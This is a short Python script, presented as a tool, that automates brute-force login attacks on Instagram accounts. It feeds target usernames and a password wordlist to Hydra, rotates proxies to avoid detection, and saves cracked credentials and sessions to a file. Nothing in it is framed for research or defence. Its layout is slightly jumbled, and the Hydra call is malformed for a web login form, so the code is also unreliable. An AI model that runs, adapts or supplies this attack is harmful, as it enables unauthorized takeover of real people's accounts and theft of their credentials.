from dotenv import load_dotenv
from rich.console import Console
import json
import time
import subprocess
import os
This script automates brute-forcing Instagram login using Hydra, rotating proxies, and saving valid credentials.

```python

# Load environment variables
load_dotenv()

INSTAGRAM_LOGIN_URL = os.getenv(
    "INSTAGRAM_LOGIN_URL", "https://www.instagram.com/login")
USERNAME_FILE = "target_usernames.txt"
PASSWORD_FILE = "wordlists/combined_passlist.txt"
PROXY_FILE = "proxy_list.txt"
LOG_FILE = "logs/hydra_brute_force.log"
OUTPUT_FILE = "sessions/valid_sessions.json"

console = Console()


def load_proxies():
    with open(PROXY_FILE, "r") as file:
        return [line.strip() for line in file.readlines() if line.strip()]


def log_attempt(username, password, proxy, status):
    with open(LOG_FILE, "a") as log:
        log.write(
            f"{time.strftime('%Y-%m-%d %H:%M:%S')} | {username} | {password} | {proxy} | {status}\n")


def save_valid_session(username, password, session_data):
    with open(OUTPUT_FILE, "a") as output:
        json.dump({"username": username, "password": password,
                  "session": session_data}, output)
        output.write("\n")


def brute_force():
    proxies = load_proxies()
    proxy_index = 0

    with open(USERNAME_FILE, "r") as user_file:
        usernames = [line.strip()
                     for line in user_file.readlines() if line.strip()]

    for username in usernames:
        console.print(
            f"[bold blue]Starting brute-force for username: {username}[/bold blue]")

        try:
            command = [
                "hydra",
                "-L", USERNAME_FILE,
                "-P", PASSWORD_FILE,
                "-s", "443",
                "-o", OUTPUT_FILE,
                INSTAGRAM_LOGIN_URL
            ]

            proxy = proxies[proxy_index]
            proxy_index = (proxy_index + 1) % len(proxies)

            env = os.environ.copy()
            env["http_proxy"] = proxy
            env["https_proxy"] = proxy

            result = subprocess.run(
                command, env=env, capture_output=True, text=True)

            if result.returncode == 0:
                console.print(
                    f"[bold green]Success for {username}[/bold green]")
                log_attempt(username, "<password-hidden>", proxy, "SUCCESS")
            else:
                console.print(f"[bold red]Failed for {username}[/bold red]")
                log_attempt(username, "<password-hidden>", proxy, "FAILED")

        except Exception as e:
            console.print(f"[bold red]Error: {e}[/bold red]")
            log_attempt(username, "<password-hidden>", "N/A", "ERROR")


if __name__ == "__main__":
    brute_force()
```
